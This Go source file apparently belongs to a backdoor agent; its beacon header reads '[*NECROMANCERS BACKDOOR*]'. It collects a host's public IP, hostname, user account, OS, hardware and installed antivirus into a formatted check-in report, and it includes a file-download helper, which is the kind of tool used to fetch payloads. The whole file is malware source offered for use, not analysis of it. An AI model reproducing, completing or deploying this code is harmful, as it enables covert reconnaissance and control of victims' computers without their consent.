package util

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strings"
	"time"

	"github.com/whiterabb17/greatwhite/modules/agent"
)

const (
	fmtInfo = "**%s Info** \n ``` \nIP Address: %s\n Computer name: %s\n Username: [%s] %s\n Operating System: %s %s\n " +
		"CPU: %s\n GPU: %s\n Memory: %s\n AV:\n    %s\n```"
)

type beatConfig struct {
	header  string
	genInfo string
	time    time.Time
	uptime  time.Duration
	sysInfo string
	footer  string
}

var SysInf string

// RemoveDuplicatesValues: A helper function to remove duplicate items in a list
func RemoveDuplicatesValues(arrayToEdit []string) []string {
	keys := make(map[string]bool)
	list := []string{}

	for _, entry := range arrayToEdit {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

// https://stackoverflow.com/questions/28828440/is-there-a-way-to-write-generic-code-to-find-out-whether-a-slice-contains-specif
func Find(slice, elem interface{}) bool {
	sv := reflect.ValueOf(slice)

	// Check that slice is actually a slice/array.
	// you might want to return an error here
	if sv.Kind() != reflect.Slice && sv.Kind() != reflect.Array {
		return false
	}

	// iterate the slice
	for i := 0; i < sv.Len(); i++ {

		// compare elem to the current slice element
		if elem == sv.Index(i).Interface() {
			return true
		}
	}

	// nothing found
	return false
}

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func UpdateStats([]int) {

}

func GrabPIP(fmt bool) string {
	resp, err := http.Get(IPProvider)
	Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	Handle(err)
	ip := strings.TrimSpace(string(ipb))
	log.Println(ip)
	if fmt {
		return strings.Replace(ip, ".", "-", -1)
	} else {
		return ip
	}
}

func Info() string {
	if Dbg {
		log.Println("[+] Gathering System Info.")
	}
	resp, err := http.Get(IPProvider)
	Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	Handle(err)
	ip := strings.TrimSpace(string(ipb))

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(AntiInfo(), "\n", "\n    ", -1)

	cfg := fmt.Sprintf(fmtInfo,
		ID, ip, host, usr.Name, usr.Username,
		runtime.GOOS, runtime.GOARCH, CPUInfo(),
		GPUInfo(), MemoryInfo(), avs,
	)
	return cfg
}

func (b *beatConfig) Format() string {
	b.uptime = time.Since(StartTime)
	if agent.DEBUG {
		fmt.Println(b.uptime)
	}
	return fmt.Sprintf("\t\t%s ```yaml\n %s\n Time: \t\t    %s\n Uptime:\t\t   %s %s```",
		b.header,
		SysInf,
		strings.Split(strings.Replace(time.Now().Format(time.RFC3339), "T", " ", 1), "+")[0],
		//		strings.Replace(b.time.Format(time.RFC3339), "T", " ", 1),
		fmt.Sprint(b.uptime),
		b.footer,
	)
}

func Register(info string) (string, string) {
	beat := beatConfig{
		header:  "```css\n\t\t\t\t\t\t\t\t\t\t\t[*NECROMANCERS BACKDOOR*]```",
		genInfo: info,
	}
	return beat.Format(), fmt.Sprint(beat.uptime)
}
